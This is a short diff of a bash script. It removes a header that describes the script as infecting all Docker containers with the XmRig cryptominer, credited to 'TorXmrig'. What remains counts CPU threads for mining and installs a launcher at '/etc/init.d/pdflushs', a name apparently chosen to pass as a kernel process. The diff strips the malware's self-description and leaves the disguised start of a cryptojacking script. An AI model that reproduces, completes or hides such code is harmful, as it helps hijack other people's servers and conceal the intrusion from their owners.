@@ -1,13 +1,4 @@
 #!/bin/bash
-# ====================================================================
-# Script Name:   Launch
-# Description:   Infects all Docker containers on x86_64 systems.
-#                The file /.dockerenv is replaced and executed by XmRig.
-# Author:        TorXmrig
-# OS:            x86_64
-# Date:          September 2, 2024
-# ====================================================================
-
 pdflushType="launch"
 threads=$(cat /proc/cpuinfo | grep "processor" | wc -l)
 launch="/etc/init.d/pdflushs"
